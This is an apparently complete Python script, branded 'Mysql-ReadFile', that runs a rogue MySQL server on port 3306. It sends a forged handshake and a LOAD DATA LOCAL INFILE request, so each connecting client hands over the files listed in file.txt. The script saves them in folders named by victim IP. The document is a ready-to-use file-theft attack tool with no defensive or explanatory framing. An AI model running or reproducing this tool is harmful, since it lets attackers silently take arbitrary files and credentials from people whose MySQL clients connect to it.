#coding=utf-8
import socket
import os
import sys
import pytz
import datetime

def mysql_get_file_content(sv,filename):
    conn, address = sv.accept()
    logpath = os.path.abspath('.') + "/log/" + address[0]
    if not os.path.exists(logpath):
        os.makedirs(logpath)

    conn.sendall("\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")
    conn.recv(9999)

    conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
    conn.recv(9999)

    wantfile=chr(len(filename)+1)+"\x00\x00\x01\xFB"+filename
    conn.sendall(wantfile)
    content=conn.recv(9999)
    conn.close()
    if len(content) >  4:
        with open(logpath + "/" + filename.replace("/", "_").replace(":", "_"), "w") as txt:
            txt.write(content)
        return True
    else:
        return False

def run():
    port = 3306
    sv = socket.socket()
    sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sv.bind(("",port))
    sv.listen(100)
    print("Start Mysql listener on port 3306.")
    print("Ready to read files")
    with open("file.txt") as f:
        for line in f.readlines():
            line = line.strip("\n")
            res = mysql_get_file_content(sv,line)
            if res:
                now = datetime.datetime.now(pytz.timezone('PRC')).strftime("%Y-%m-%d %H:%M:%S")
                print('[{}]'.format(now))
                print('Get {0} file Success.\n'.format(line))
            else:
                now = datetime.datetime.now(pytz.timezone('PRC')).strftime("%Y-%m-%d %H:%M:%S")
                print('[{}]'.format(now))
                print("Get {0} file Fail. ".format(line))
            

if __name__ == "__main__":
    print("""
------------------------------------------------------------------
 ____          _ _____ _ _            __  __       ____   ___  _     
|  _ \ ___  __| |  ___(_) | ___      |  \/  |_   _/ ___| / _ \| |    
| |_) / _ \/ _` | |_  | | |/ _ \_____| |\/| | | | \___ \| | | | |    
|  _ <  __/ (_| |  _| | | |  __/_____| |  | | |_| |___) | |_| | |___ 
|_| \_\___|\__,_|_|   |_|_|\___|     |_|  |_|\__, |____/ \__\_\_____|
                                             |___/                   
            
                   Mysql-ReadFile
               Author:Al1ex@Heptagram
        Github:https://github.com/Al1ex   
------------------------------------------------------------------
        """)
    run()